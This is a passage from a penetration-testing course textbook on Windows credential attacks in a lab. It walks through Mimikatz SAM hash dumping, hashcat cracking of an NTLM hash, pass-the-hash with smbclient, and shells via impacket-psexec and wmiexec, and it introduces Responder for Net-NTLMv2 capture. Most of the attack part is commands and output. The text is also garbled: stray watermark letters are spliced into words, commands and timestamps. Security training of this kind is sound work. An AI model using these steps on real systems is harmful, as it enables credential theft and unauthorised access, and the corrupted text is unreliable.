...
Listing 292 - Enabling SeDebugPrivilege, elevating to SYSTEM user privileges and extracting NTLM hashes
The output shows that we successfully enabled the SeDebugPrivilege access right and obtained
SYSTEM user privileges. The output of the lsadump::sam command reveals two NTLM hashes,
one for offsec and one for nelly. Since we already know that the NTLM hash of offsec was
calculated from the plaintext password “lab”, we’ll skip it and focus on nelly’s NTLM hash.
Let’s copy the NTLM hash and paste it into nelly.hash in the passwordattacks directory on our
Kali machine.
kali@kali:~/passwordattacks$ cat nelly.hash
3ae8e5f0ffabb3a627672e1600f1ba10
Listing 293 - NTLM hash of user nelly in nelly.hash
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 413
Made in Morocco
Penetration Testing with Kali Linux
Next, we’ll retrieve the correct hash mode from Hashcat’s help output.
kali@kali:~/passwordattacks$ hashcat --help | grep -i "ntlm"
5500 | NetNTLMv1 / NetNTLMv1+ESS | Network Protocol
27000 | NetNTLMv1 / NetNTLMv1+ESS (NT) | Network Protocol
5600 | NetNTLMv2 | Network Protocol
27100 | NetNTLMv2 (NT) | Network Protocol
1000 | NTLM | Operating System
Listing 294 - Hashcat mode for NTLM hashes
The output indicates that the correct mode is 1000.
We now have everything we need to start cracking the NTLM hash. We’ve already extracted the
hash because Mimikatz outputs a format that Hashcat accepts. The next step is choosing a
wordlist and rule file. For this example we’ll use the rockyou.txt worydlist with the best64.rule rule
file, which contains 64 effective rules.
k
Let’s provide all arguments and values to the hashcat command to start the cracking process.
kali@kali:~/passwordattacks$ hashcat -m 1000 nellys.hash
/usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
hashcat (v6.2.5) starting
... o
3ae8e5f0ffabb3a627672e1600f1ba10:nicole1
n
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1000 (NTLM)
i
Hash.Target......: 3ae8e5f0ffabb3a627672e1600f1ba10
Time.Started.....: Thu Jun 2 z04:11:28 2022, (0 secs)
Time.Estimated...: Thu Jun 2 04:11:28 2022, (0 secs)
Kernel.Feature...: Pure Kernel
D
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Mod........: Rules (/usr/share/hashcat/rules/best64.rule)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 17926.2 kH/s (2.27ms) @ Accel:256 Loops:77 Thr:1 Vec:8
...
Listing 295 - NTLM hash of user nelly in nelly.hash and Hashcat mode
The output shows that we successfully cracked the NTLM hash of the nelly user. The plaintext
password used to create this hash is nicole1. Let’s confirm this by connecting to the system with
RDP.
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 414
Made in Morocco
Penetration Testing with Kali Linux
y
k
s
o
n
Figure 219: RDP Connection as nelly
i
Very nice! We successfully cracked the NTLM hash and used the password to log in via RDP.
z
In this section we obtained a basic understanding of the SAM and NTLM hashes. We also
demonstrated how we canD use Mimikatz to obtain NTLM hashes and followed our cracking
methodology to crack the hash.
While we did all of this on a local system without an Active Directory environment, this process
applies to enterprise environments and is a crucial skill for most real-life penetration tests. In the
next section we’ll demonstrate how we can leverage NTLM hashes even if we are unable to crack
them.
13.3.2 Passing NTLM
In the last section, we obtained an NTLM hash and cracked it. Depending on the strength of the
password this may be time-consuming or unfeasible. In this section, we’ll demonstrate how we
can leverage an NTLM hash without cracking it.
First, we will demonstrate the pass-the-hash (PtH) technique. We can use this technique to
authenticate to a local or remote target with a valid combination of username and NTLM hash
rather than a plaintext password. This is possible because NTLM/LM password hashes are not
salted and remain static between sessions. Moreover, if we discover a password hash on one
target, we can use it to not only authenticate to that target, but to another target as well, as long
as the second target has an account with the same username and password. To leverage this
into code execution of any kind, the account also needs administrative privileges on the second
target.
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 415
Made in Morocco
Penetration Testing with Kali Linux
If we don’t use the local Administrator user in pass-the-hash, the target machine also needs to be
configured in a certain way to obtain successful code execution. Since Windows Vista, all
Windows versions have UAC remote restrictions660 enabled by default. This prevents software or
commands from running with administrative rights on remote systems. This effectively mitigates
this attack vector for users in the local administrator group aside from the local Administrator
account.
In this demonstration, let’s assume that we’ve already gained access to FILES01 and obtained the
password (password123!) for the gunther user. We want to extract the Administrator’s NTLM hash
and use it to authenticate to the FILES02 machine. Our goal is to gain access to a restricted SMB
share and leverage pass-the-hash to obtain an interactive shell on FILES02.
We’ll assume that the local Administrator accounts on both machines, FILES01 and FILES02, have
the same password. This is quite common and is often found in real-life assessments.
y
We’ll begin by connecting to FILES01 (192.168.50.211) with RDP using a username of gunther
and a password of password123!. We’ll then start Windows Explorer and enter the path of the
k
SMB share (\\192.168.50.212\secrets) in the navigation bar. After entering the command, we are
prompted for credentials to connect to the share.
s
o
n
i
z
D
Figure 220: RDP Connection as nelly
When we enter our credentials for the gunther user, we are notified that Windows cannot access
this share. This means that the user account does not exist on FILES02 or it doesn’t have the
necessary permissions to access the share.
Now, let’s obtain the NTLM hash of Administrator with Mimikatz, as we did in the previous
section. Again, Mimikatz is located in C:\tools on FILES01. We’ll open a PowerShell window as
660 (Microsoft Documentation, 2022), https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/user-
account-control-and-remote-restriction
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 416
Made in Morocco
Penetration Testing with Kali Linux
Administrator and fire up Mimikatz. Next, we’ll enter the commands privilege::debug,
token::elevate, and lsadump::sam to retrieve the stored NTLM hash from the SAM.
mimikatz # privilege::debug
Privilege '20' OK
mimikatz # token::elevate
...
mimikatz # lsadump::sam
...
RID : 000001f4 (500)
User : Administrator
Hash NTLM: 7a38310ea6f0027ee955abed1762964b
...
Listing 296 - Enabling SeDebugPrivilege, retrieving SYSTEM user privileges anyd extracting NTLM hashes
Listing 296 displays the output of the NTLM hash extraction. We’ll save the Administrator NTLM
k
hash for later use.
To leverage pass-the-hash (PtH), we need tools that support authentication with NTLM hashes.
s
Fortunately for us, we have many to choose from. Let’s review a few examples for different use
cases. For SMB enumeration and management, we can use smbclient661 or CrackMapExec.662 For
o
command execution, we can use the scripts from the impacket663 library like psexec.py664 and
wmiexec.py.665 We can also use NTLM hashes to not only connect to target systems with SMB,
but also via other protocols like RDP and nWinRM,666 if the user has the required rights. We can
also use Mimikatz to conduct pass-the-hash as well.
Since the first goal of this demonsitration is to gain access to an SMB share by providing an
NTLM hash, we’ll use smbclient. z
To use the command, we need to enter the path of the share as the first argument by escaping
D
the backslashes. In this case, we will enter \\\\192.168.59.212\\secrets. We’ll use the -U
Administrator to set the user and --pw-nt-hash to indicate the hash.
After we successfully connect to the SMB share “secrets” with smbclient, we can list all files in the
SMB share with dir. We can also use the get command to download files to our Kali machine.
kali@kali:~$ smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash
7a38310ea6f0027ee955abed1762964b
Try "help" to get a list of possible commands.
smb: \> dir
. D 0 Thu Jun 2 16:55:37 2022
.. DHS 0 Thu Jun 2 16:55:35 2022
secrets.txt A 4 Thu Jun 2 11:34:47 2022
661 (Samba, 2022), https://www.samba.org/samba/docs/current/man-html/smbclient.1.html
662 (Github, 2022), https://github.com/byt3bl33d3r/CrackMapExec
663 (Github, 2022), https://github.com/SecureAuthCorp/impacket
664 (Github, 2022), https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py
665 (Github, 2021), https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py
666 (Microsoft Documentation, 2021), https://docs.microsoft.com/en-us/windows/win32/winrm/portal
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 417
Made in Morocco
Penetration Testing with Kali Linux
4554239 blocks of size 4096. 771633 blocks available
smb: \> get secrets.txt
getting file \secrets.txt of size 4 as secrets.txt (0.0 KiloBytes/sec) (average 0.0
KiloBytes/sec)
Listing 297 - Using smbclient with NTLM hash
We successfully connected to the SMB share by providing the NTLM hash instead of a password.
The directory listing reveals a secrets.txt file. After downloading the file we can view its contents.
In the first part of this demonstration we used an NTLM hash to gain access to a SMB share. In
the second part, our goal is to obtain an interactive shell. Again, we have a variety of different
tools and scripts at our disposal but here we’ll use the psexec.py script from the impacket library.
The script is very similar to the original Sysinternals PsExec667 command. It searches for a
writable share and uploads an executable file to it. Then it registers tyhe executable as a Windows
service and starts it. The desired result is often to obtain an interactive shell or code execution.
k
We can use the impacket-scripts668 package to execute psexec.py on Kali. This package contains
links to the example scripts of the impacket library and provides a user-friendly way to use them.
s
To execute psexec, we can enter impacket-psexec with two arguments. The first argument is -
hashes, which allows us to use NTLM hashes to authenticate to the target. The format is
o
“LMHash:NTHash”, in which we specify the Administrator NTLM hash after the colon. Since we
only use the NTLM hash, we can fill the LMHash section with 32 0’s.
n
The second argument is the target definition in the format “username@ip”.
At the end of the command we coiuld specify another argument, which is used to determine
which command psexec should ezxecute on the target system. If we leave it empty, cmd.exe will
be executed, providing us with an interactive shell.
D
kali@kali:~$ impacket-psexec -hashes
00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b
PI:EMAIL
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
[*] Requesting shares on 192.168.50.212.....
[*] Found writable share ADMIN$
[*] Uploading file nvaXenHl.exe
[*] Opening SVCManager on 192.168.50.212.....
[*] Creating service MhCl on 192.168.50.212.....
[*] Starting service MhCl.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.707]
(c) Microsoft Corporation. All rights reserved.
C:\Windows\system32> hostname
FILES02
C:\Windows\system32> ipconfig
667 (Microsoft Documentation, 2021), https://docs.microsoft.com/en-us/sysinternals/downloads/psexec
668 (Kali Tools, 2022), https://www.kali.org/tools/impacket-scripts/
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 418
Made in Morocco
Penetration Testing with Kali Linux
Windows IP Configuration
Ethernet adapter Ethernet0:
Connection-specific DNS Suffix . :
Link-local IPv6 Address . . . . . : fe80::7992:61cd:9a49:9046%4
IPv4 Address. . . . . . . . . . . : 192.168.50.212
Subnet Mask . . . . . . . . . . . : 255.255.255.0
Default Gateway . . . . . . . . . : 192.168.50.254
C:\Windows\system32> whoami
nt authority\system
C:\Windows\system32> exit y
kali@kali:~$
Listing 298 - Using psexec to get an interacktive shell
We successfully obtained an interactive shell on FILES02. Due to the nature of psexec.py, we’ll
s
always receive a shell as SYSTEM instead of the user we used to authenticate.
We can also use one of the other impacket scriptso like wmiexec.py to obtain a shell as the user we
used for authentication. On Kali, we would use impacket-wmiexec along with the arguments we
used for impacket-psexec.
n
kali@kali:~$ impacket-wmiexec -hashes
00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b
i
PI:EMAIL
Impacket v0.9.24 - Copyright 2z021 SecureAuth Corporation
[*] SMBv3.0 dialect used
D
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
files02\administrator
C:\>
Listing 299 - Using wmiexec to get an interactive shell
As the whoami output shows, we obtained a shell as the Administrator user with wmiexec instead
of SYSTEM.
In this section, we used pass-the-hash to gain access to an SMB share. We then used the hash to
obtain an interactive shell with impacket-psexec and impacket-wmiexec.
13.3.3 Cracking Net-NTLMv2
In some penetration tests, we may obtain code execution or a shell on a Windows system as an
unprivileged user. This means that we cannot use tools like Mimikatz to extract passwords or
NTLM hashes. In situations like these, we can abuse the Net-NTLMv2 network authentication
protocol. This protocol is responsible for managing the authentication process for Windows
clients and servers over a network.
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 419
Made in Morocco
Penetration Testing with Kali Linux
We use “Net-NTLMv2” to refer to the formally correct NTLMv2. Since “Net-
NTLMv2” is more commonly used in our industry, we use it in this course to
avoid confusion.
Let’s walk through an example to get familiar with the basics of the authentication process. In this
example, our goal is to gain access to an SMB share on a Windows 2022 server from a Windows
11 client via Net-NTLMv2.
At a high level, we’ll send the server a request, outlining the connection details to access the SMB
share. Then the server will send us a challenge in which we encrypt data for our response with
our NTLM hash to prove our identity. The server will then check our challenge response and either
grant or deny access, accordingly.
y
However, our specific goal is to use Net-NTLMv2 for this exercise since it is less secure than the
more modern Kerberos669 protocol. This is common in the real-world since the majority of
k
Windows environments still rely on the older protocol, especially as a way to support older
devices that may not support Kerberos.
s
Since we’ll find Net-NTLMv2 in nearly all Windows networks and environments, it is vital to
understand how we can abuse its weaknesseso. To do this, we need our target to start an
authentication process using Net-NTLMv2 against a system we control. We need to prepare our
system so that it handles the authentication process and shows us the Net-NTLMv2 hash the
n
target used to authenticate.
The Responder tool is excellent for this.670 It includes a built-in SMB server that handles the
i
authentication process for us and prints all captured Net-NTLMv2 hashes. While it also includes
z
other protocol servers (including HTTP and FTP) as well as Link-Local Multicast Name Resolution
(LLMNR),671 NetBIOS Name Service (NBT-NS),672 and Multicast DNS (MDNS)673 poisoning
capabilities,674 we’ll focus oDn capturing Net-NTLMv2 hashes with the SMB server in this section.
If we’ve obtained code execution on a remote system, we can easily force it to authenticate with
us by commanding it to connect to our prepared SMB server. For example, we can simply run ls
\\192.168.119.2\share in PowerShell (assuming our Responder is listening on that IP). If we don’t
have code execution, we can also use other vectors to force an authentication. For example,